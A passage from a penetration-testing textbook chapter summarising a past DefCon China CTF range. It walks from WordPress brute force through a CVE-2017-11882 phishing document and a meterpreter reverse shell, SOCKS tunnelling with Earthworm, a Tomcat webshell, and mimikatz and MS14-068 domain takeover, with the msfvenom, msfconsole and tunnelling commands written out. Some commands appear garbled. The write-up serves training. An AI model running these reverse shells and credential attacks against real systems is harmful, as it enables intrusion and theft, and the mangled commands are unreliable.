## Chapter 12: Virtual Target Penetration Testing
### 12.6 Practical Penetration Test Challenges

The primary difference between CTF (Capture the Flag) challenges and real-world penetration tests is that CTFs always have a solution, and every piece of information in the challenge is crucial, including emails, links, and website articles. Competitors must align with the questioner's thought process and pay close attention to revealed information.

In the following sections, I will introduce some CTF challenges I have encountered, though I will not provide detailed steps as the challenge environments no longer exist.

#### 12.6.1 DefCon China Shooting Range Questions

**Figure 12.72: The entire challenge's solving process**

1. **Wordpress Exploitation**
   - **Target**: 192.168.1.2
   - **Actions**:
     - Used `wpscan` to scan for plugins and brute-force the admin password.
     - Found the password `admin/admin`.
     - Also found the SSH password `root/admin`.
     - Obtained the first flag: `flag{welCome_to_DeFcon_ChiNa}`.

**Figure 12.73: Get flag**

2. **Word Document Phishing**
   - **Configuration**:
     - Apache configuration revealed port 8000, which points to the upload directory of the Wordpress site.
     - HTTP logs showed a bot periodically requesting `report.doc`.

**Figure 12.74: Configuration**
**Figure 12.75: Result**

- **Exploitation**:
  1. Set up port forwarding using SSH to access the backdoor.
     - Command: `ssh - CfNg -R 13339 :127.0.0.1: 13338 root@192.168.1.2`
  2. Generated an HTA malicious file using `msfvenom` to create a reverse TCP connection.
     - Command: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=13338 -f hta-psh`
  3. Created a malicious DOC file using the exploit.
     - Command: `msfconsole > use exploit/windows/office/cve_2017_11882 > set payload windows/meterpreter/reverse_tcp > set LHOST 0.0.0.0 > set LPORT 13338 > exploit`
  4. Listened for the connection on port 13338.
     - Commands: 
       - `use multi/handler`
       - `set payload windows/meterpreter/reverse_tcp`
       - `set LHOST 0.0.0.0`
       - `set LPORT 13338`
       - `exploit -j`
  - Successfully established a backdoor connection from 192.168.2.114.

**Figure 12.77: Get flag**

3. **Tomcat Exploitation**
   - **Target**: 192.168.2.114
   - **Actions**:
     1. Added a route to access the 192.168.2.1/24 network via Metasploit.
        - Command: `run autoroute -s 192.168.2.1/24`
     2. Performed port scanning.
        - Commands:
          - `use auxiliary/scanner/portscan/tcp`
          - `set RHOSTS 192.168.2.1/24`
          - `set PORTS 3389, 445, 22, 80, 8080`
          - `set THREADS 50`
          - `exploit`
     3. Uploaded and configured Earthworm for faster proxying.
        - Commands:
          - `./ew_for_linux64 -s rcsocks -l 10080 -e 8881`
          - `C:/Users/RTF/Desktop/ev.exe -s rssocks -d 192.168.1.2 -e 8881`
     - Deployed a war package to get a webshell with root privileges and obtained a flag.

**Figure 12.78: Get flag**

- **Database Information**:
  - Found MySQL connection details in `/var/www/html/inc/config.php`.
  - Query results revealed a password: `admin@test.COM`.

4. **Windows PC Exploitation**
   - **Target**: 192.168.2.112
   - **Actions**:
     - Used `smb_login` module in Metasploit to brute-force the password.
     - Successfully logged in and forwarded port 3389 for remote desktop access.
     - Established a backdoor connection with administrator privileges.

**Figure 12.80: Result**

5. **Attacking Windows Domain Controller**
   - **Target**: ADPC
   - **Actions**:
     - Captured the password using mimikatz: `admin@test.COM`.
     - Used `net user` to confirm the user's domain status.
     - Exploited `ms14-068` to attack the domain controller.
     - Commands:
       - `ms14-068.exe -u DomainMember@domain -s DomainMemberSID -d DomainControllerIP -p admin@test.COM`
     - Injected forged credentials and purged existing ones.
     - Logged into the domain controller and obtained the final flag.

### 12.7 Summary
This chapter covered building a penetration testing environment for common vulnerabilities in Windows and Linux, exploiting these vulnerabilities, and understanding their principles. It also demonstrated various attack techniques through practical scenarios and historical CTF challenges. While this chapter provides a foundation, readers are encouraged to practice and expand their skills. A set of virtual targets is available on the N1BOOK platform for local practice.

We hope this technical chapter has been informative and valuable for our readers.
